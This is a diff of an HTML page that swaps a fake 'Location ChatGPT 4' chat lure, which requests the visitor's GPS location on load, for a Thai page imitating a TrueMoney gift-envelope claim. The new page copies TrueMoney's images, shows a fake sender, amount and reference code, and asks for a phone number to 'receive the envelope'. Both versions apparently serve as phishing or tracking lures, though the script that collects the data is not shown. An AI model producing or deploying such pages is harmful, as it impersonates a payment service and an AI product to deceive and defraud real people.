@@ -1,51 +1,129 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <title>Find - people</title>
-  <link rel="stylesheet" href="./style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ทรูมันนี่ - รับซอง</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="style.css">
 
 </head>
-<body onload="gpsLocation()">
-<section class="msger">
-  <header class="msger-header">
-    <div class="msger-header-title">
-      <i class="fas fa-comment-alt"></i> Location ChatGPT 4
-    </div>
-    <div class="msger-header-options">
-      <span><i class="fas fa-cog"></i></span>
-    </div>
-  </header>
 
-  <main class="msger-chat">
-    <div class="msg left-msg">
-      <div
-       class="msg-img"
-       style="background-image: url(https://image.flaticon.com/icons/svg/327/327779.svg)"
-      ></div>
+<body>
 
-      <div class="msg-bubble">
-        <div class="msg-info">
-          <div class="msg-info-name">Admin</div>
-          <div class="msg-info-time"></div>
-        </div>
+<div class="container">
 
-        <div class="msg-text">
-          Hi Welcome to Location GPT-4. Turn on your location for find people near you.📍
-        </div>
-      </div>
-    </div>
+<div id="redeem-page">
 
-  </main>
+<img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
 
-  <form class="msger-inputarea">
-    <input type="text" class="msger-input" placeholder="Ask me anything...">
-    <button type="submit" class="msger-send-btn">Send</button>
-  </form>
-</section>
-<script  src="./script.js"></script>
-<p id="techchip"></p>
-<!-- tc_payload -->
+<div class="sender-info">
+<div class="sender-name">ปัญญาภร ***</div>
+<div class="sender-sub">ส่งซองทรูมันนี่ให้คุณ</div>
+</div>
+
+<div class="input-box">
+
+<label class="input-label">
+กรอกเบอร์โทรศัพท์เพื่อรับซอง
+</label>
+
+<input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
+
+</div>
+
+<div class="links">
+
+<div>
+หากคุณยังไม่มีบัญชีทรูมันนี่ 
+<a href="https://www.truemoney.com/" target="_blank">
+สมัครสมาชิกที่นี่
+</a>
+</div>
+
+<a class="detail-link" onclick="showPage('detail-page')">
+ดูรายละเอียดซอง
+</a>
+
+</div>
+
+<button class="btn-orange" onclick="startRedeem()">
+รับซองเลย
+</button>
+
+</div>
+
+<div id="detail-page">
+
+<img class="envelope-header-img"
+src="https://i.postimg.cc/1XkR8j53/โหลดดาว.png">
+
+<div class="info-table">
+
+<div class="info-row">
+<span>จำนวนเงินที่เพื่อนรับไปแล้ว</span>
+<span class="info-value">฿ 0.00/10.00</span>
+</div>
+
+<div class="info-row">
+<span>เปิดรับซองแล้ว</span>
+<span class="info-value">0/1 คน</span>
+</div>
+
+<div class="info-row">
+<span>รูปแบบการแบ่งเงิน</span>
+<span class="info-value">แบ่งเท่ากัน</span>
+</div>
+
+<div class="info-row">
+<span>ข้อความถึงผู้รับ</span>
+<span class="info-value">-</span>
+</div>
+
+<div class="info-row">
+<span>วันที่ซองหมดอายุ</span>
+<span class="info-value">
+31 มี.ค. 2569 เวลา 1:25 น.
+</span>
+</div>
+
+</div>
+
+<div class="list-title">
+รายชื่อเพื่อนที่รับซองไปแล้ว
+</div>
+
+<img class="empty-img"
+src="https://gift.truemoney.com/campaign/static/media/empty_list.5c889a7a.png">
+
+<div class="ref-code">
+เลข อ้างอิงซอง: 738781071639237989
+</div>
+
+<button class="btn-orange" onclick="goToApp()">
+ไปที่แอปทรูมันนี่
+</button>
+
+</div>
+
+</div>
+
+<div id="loading-screen">
+
+<div class="spinner"></div>
+
+<div class="loading-text">
+รอสักครู่ กำลังดำเนินการ...
+</div>
+
+</div>
+
+<script src="script.js"></script>
 
 </body>
 </html>
